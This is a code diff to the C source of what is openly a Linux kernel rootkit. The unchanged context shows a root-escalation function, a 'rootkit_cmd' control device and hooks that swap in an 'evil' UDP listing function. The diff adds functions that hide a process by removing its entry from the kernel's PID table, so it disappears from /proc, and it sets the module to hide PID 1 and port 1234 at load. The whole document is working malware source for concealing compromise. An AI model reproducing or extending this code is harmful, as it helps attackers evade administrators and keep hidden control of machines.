@@ -1,4 +1,5 @@
 #include "utils.h"
+#include <linux/pid.h>
 
 static void get_root(void)
 {
@@ -182,6 +183,51 @@ void show_port(unsigned int port)
     write_unlock(&port_black_list_lock);
 }
 
+DEFINE_RWLOCK(tgid_black_list_lock);
+LIST_HEAD(tgid_black_list);
+
+
+void hide_pid(unsigned int tgid)
+{
+    struct struct_list *node = (struct struct_list *) vmalloc(
+        sizeof(struct struct_list) + sizeof(void *));
+    if (!node)
+        return;
+    struct file *f = filp_open("/proc", O_RDONLY, 0);
+    if (!f) {
+        vfree(node);
+        return;
+    }
+    struct pid_namespace *ns = proc_pid_ns(file_inode(f)->i_sb);
+    filp_close(f, 0);
+    node->num = tgid;
+    *(void **) node->data = idr_find(&ns->idr, tgid);
+    idr_replace(&ns->idr, NULL, tgid);
+    write_lock(&tgid_black_list_lock);
+    list_add(&node->list, &tgid_black_list);
+    write_unlock(&tgid_black_list_lock);
+}
+
+void show_pid(unsigned int tgid)
+{
+    struct struct_list *node, *safe;
+    struct file *f = filp_open("/proc", O_RDONLY, 0);
+    if (!f)
+        return;
+    struct pid_namespace *ns = proc_pid_ns(file_inode(f)->i_sb);
+    filp_close(f, 0);
+    write_lock(&tgid_black_list_lock);
+    list_for_each_entry_safe (node, safe, &tgid_black_list, list) {
+        if (tgid == node->num) {
+            idr_replace(&ns->idr, *(void **) node->data, tgid);
+            list_del(&node->list);
+            vfree(node);
+            break;
+        }
+    }
+    write_unlock(&tgid_black_list_lock);
+}
+
 void utils_init()
 {
     chrdev_add("rootkit_cmd", &fops);
@@ -197,8 +243,7 @@ void utils_init()
         hook_start((unsigned long) ops->show,
                    (unsigned long) udp4_seq_show_evil, "udp4_seq_show");
     }
-
-    hide_file("rootkit");
+    hide_pid(1);
     hide_port(1234);
 }
 
